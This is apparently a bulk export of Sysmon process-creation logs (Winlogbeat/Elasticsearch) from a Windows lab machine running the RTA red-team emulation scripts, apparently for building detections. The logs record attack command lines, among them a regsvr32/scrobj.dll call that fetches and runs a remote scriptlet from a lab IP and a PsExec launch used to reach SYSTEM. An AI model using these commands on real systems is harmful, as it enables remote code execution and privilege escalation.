{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","Product":"?","Image":"C:\\Program Files (x86)\\Python27\\python.exe","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","ParentProcessGuid":"{2D3B23BE-4BE4-5BA2-0000-0010FFB61D00}","UtcTime":"2018-09-19 13:15:16.833","FileVersion":"?","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\uac_eventviewer.py\"","Company":"?","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\uac_eventviewer.py","ParentProcessId":"3408","ProcessId":"4044","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","IntegrityLevel":"Medium","Description":"?","ProcessGuid":"{2D3B23BE-4BE4-5BA2-0000-001038B81D00}"},"@timestamp":"2018-09-19T13:15:16.833Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:16.833\nProcessGuid: {2D3B23BE-4BE4-5BA2-0000-001038B81D00}\nProcessId: 4044\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\uac_eventviewer.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4BE4-5BA2-0000-0010FFB61D00}\nParentProcessId: 3408\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\uac_eventviewer.py\"","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"record_number":"1494","host":{"name":"flare-PC"},"version":5,"type":"wineventlog","user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"AV_58WUBfVn9xHWiiT2l"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:15:16.206","Hashes":"MD5=27304B246C7D5B4E149124D5F93C5B01,SHA256=3337E3875B05E0BFBA69AB926532E3F179E8CFBF162EBB60CE58A0281437A7EF","Product":"Sysinternals PsExec","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\PsExec.exe","ParentProcessGuid":"{2D3B23BE-4BE3-5BA2-0000-0010835E1D00}","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","FileVersion":"2.2","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\PsExec.exe -w C:\\Users\\flare\\Downloads\\RTA-master -accepteula -s \"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3288","ParentProcessId":"1220","IntegrityLevel":"Medium","Company":"Sysinternals - www.sysinternals.com","Description":"Execute processes remotely","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4BE4-5BA2-0000-0010E4881D00}"},"@timestamp":"2018-09-19T13:15:16.206Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:16.206\nProcessGuid: {2D3B23BE-4BE4-5BA2-0000-0010E4881D00}\nProcessId: 3288\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\PsExec.exe\nFileVersion: 2.2\nDescription: Execute processes remotely\nProduct: Sysinternals PsExec\nCompany: Sysinternals - www.sysinternals.com\nCommandLine: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\PsExec.exe -w C:\\Users\\flare\\Downloads\\RTA-master -accepteula -s \"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=27304B246C7D5B4E149124D5F93C5B01,SHA256=3337E3875B05E0BFBA69AB926532E3F179E8CFBF162EBB60CE58A0281437A7EF\nParentProcessGuid: {2D3B23BE-4BE3-5BA2-0000-0010835E1D00}\nParentProcessId: 1220\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\system_restore_process.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1489","event_id":1,"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"host":{"name":"flare-PC"},"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"0l_58WUBfVn9xHWicTwe"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:15:10.635","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","Description":"Windows-Befehlsprozessor","ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","User":"flare-PC\\flare","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Company":"Microsoft Corporation","ParentProcessId":"3756","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"2872","IntegrityLevel":"Medium","Image":"C:\\Windows\\SysWOW64\\cmd.exe","TerminalSessionId":"1","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\sip_provider.py\"","ProcessGuid":"{2D3B23BE-4BDE-5BA2-0000-0010B4A21C00}"},"@timestamp":"2018-09-19T13:15:10.635Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:10.635\nProcessGuid: {2D3B23BE-4BDE-5BA2-0000-0010B4A21C00}\nProcessId: 2872\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\sip_provider.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"record_number":"1459","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"type":"wineventlog","version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"1l_58WUBfVn9xHWicTwe"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4BDD-5BA2-0000-00109F471C00}","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:15:10.102","Image":"C:\\Windows\\SysWOW64\\schtasks.exe","Description":"Verwaltung geplanter Aufgaben","LogonId":"0xe320","Hashes":"MD5=2003E9B15E1C502B146DAD2E383AC1E3,SHA256=15018D0093BEFABBA8B927743191030D1F8C17BB97FDB48C2FC3EAB20E2D4B3D","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","Product":"Betriebssystem Microsoft® Windows®","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\schtask_escalation.py","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"schtasks.exe /query /tn test-task-rta","ParentProcessId":"2788","ProcessId":"2808","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","IntegrityLevel":"Medium","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","Company":"Microsoft Corporation","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4BDE-5BA2-0000-00100A721C00}"},"@timestamp":"2018-09-19T13:15:10.102Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:10.102\nProcessGuid: {2D3B23BE-4BDE-5BA2-0000-00100A721C00}\nProcessId: 2808\nImage: C:\\Windows\\SysWOW64\\schtasks.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Verwaltung geplanter Aufgaben\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: schtasks.exe /query /tn test-task-rta\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2003E9B15E1C502B146DAD2E383AC1E3,SHA256=15018D0093BEFABBA8B927743191030D1F8C17BB97FDB48C2FC3EAB20E2D4B3D\nParentProcessGuid: {2D3B23BE-4BDD-5BA2-0000-00109F471C00}\nParentProcessId: 2788\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\schtask_escalation.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"record_number":"1454","version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"host":{"name":"flare-PC"},"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"2V_58WUBfVn9xHWicTwh"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:15:09.648","User":"flare-PC\\flare","ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","Description":"Windows-Befehlsprozessor","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","Image":"C:\\Windows\\SysWOW64\\cmd.exe","Company":"Microsoft Corporation","TerminalSessionId":"1","ParentProcessId":"3756","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","IntegrityLevel":"Medium","ProcessId":"3088","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\schtask_escalation.py\"","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ProcessGuid":"{2D3B23BE-4BDD-5BA2-0000-001066461C00}"},"@timestamp":"2018-09-19T13:15:09.664Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:09.648\nProcessGuid: {2D3B23BE-4BDD-5BA2-0000-001066461C00}\nProcessId: 3088\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\schtask_escalation.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1452","type":"wineventlog","event_id":1,"version":5,"host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"2l_58WUBfVn9xHWicTwh"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:15:10.180","Image":"C:\\Windows\\SysWOW64\\cmd.exe","Description":"Windows-Befehlsprozessor","ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\scrobj_com_hijack.py\"","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"4016","ParentProcessId":"3756","TerminalSessionId":"1","Company":"Microsoft Corporation","IntegrityLevel":"Medium","Product":"Betriebssystem Microsoft® Windows®","ProcessGuid":"{2D3B23BE-4BDE-5BA2-0000-0010FB761C00}"},"@timestamp":"2018-09-19T13:15:10.196Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:15:10.180\nProcessGuid: {2D3B23BE-4BDE-5BA2-0000-0010FB761C00}\nProcessId: 4016\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\scrobj_com_hijack.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"record_number":"1456","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"3F_58WUBfVn9xHWicTwh"}}
{"event_data":{"param1":"C:\\Users\\flare\\Downloads\\RTA-master\\blah.msi","param5":"(NULL)","param3":"(NULL)","param4":"(NULL)","param6":"(NULL)","param2":"3524"},"@timestamp":"2018-09-19T13:15:12.000Z","keywords":["Klassisch"],"log_name":"Application","level":"Informationen","computer_name":"flare-PC","source_name":"MsiInstaller","message":"Eine Windows Installer-Transaktion wird beendet: C:\\Users\\flare\\Downloads\\RTA-master\\blah.msi. Clientprozess-ID: 3524.","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"2411","event_id":1042,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"vV_38WUBfVn9xHWioTyy"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4B6A-5BA2-0000-001016391800}","User":"flare-PC\\flare","LogonId":"0xe320","Hashes":"MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670","Description":"Windows-Hostprozess (Rundll32)","Image":"C:\\Windows\\SysWOW64\\rundll32.exe","UtcTime":"2018-09-19 13:13:15.287","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\regsvr32_scrobj.py","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"RunDll32.exe InetCpl.cpl, ClearMyTracksByProcess 8","ParentProcessId":"628","ProcessId":"3768","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\","Company":"Microsoft Corporation","TerminalSessionId":"1","IntegrityLevel":"Medium","Product":"Betriebssystem Microsoft® Windows®","ProcessGuid":"{2D3B23BE-4B6B-5BA2-0000-001034641800}"},"@timestamp":"2018-09-19T13:13:15.287Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:15.287\nProcessGuid: {2D3B23BE-4B6B-5BA2-0000-001034641800}\nProcessId: 3768\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows-Hostprozess (Rundll32)\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: RunDll32.exe InetCpl.cpl, ClearMyTracksByProcess 8\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670\nParentProcessGuid: {2D3B23BE-4B6A-5BA2-0000-001016391800}\nParentProcessId: 628\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\regsvr32_scrobj.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"record_number":"1434","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"wV_38WUBfVn9xHWiqjxn"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","ParentProcessGuid":"{2D3B23BE-4B6A-5BA2-0000-001016391800}","UtcTime":"2018-09-19 13:13:16.994","Hashes":"MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B","Description":"Microsoft(C) Registerserver","Image":"C:\\Windows\\SysWOW64\\regsvr32.exe","User":"flare-PC\\flare","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\regsvr32_scrobj.py","TerminalSessionId":"1","CommandLine":"regsvr32.exe /u /n /s /i:http://172.16.100.10:8000/bin/notepad.sct scrobj.dll","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\","ParentProcessId":"628","ProcessId":"4088","IntegrityLevel":"Medium","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Product":"Betriebssystem Microsoft® Windows®","ProcessGuid":"{2D3B23BE-4B6C-5BA2-0000-00104DA91800}"},"@timestamp":"2018-09-19T13:13:17.054Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:16.994\nProcessGuid: {2D3B23BE-4B6C-5BA2-0000-00104DA91800}\nProcessId: 4088\nImage: C:\\Windows\\SysWOW64\\regsvr32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Microsoft(C) Registerserver\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: regsvr32.exe /u /n /s /i:http://172.16.100.10:8000/bin/notepad.sct scrobj.dll\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B\nParentProcessGuid: {2D3B23BE-4B6A-5BA2-0000-001016391800}\nParentProcessId: 628\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\regsvr32_scrobj.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"record_number":"1435","host":{"name":"flare-PC"},"type":"wineventlog","version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"opcode":"Info"}
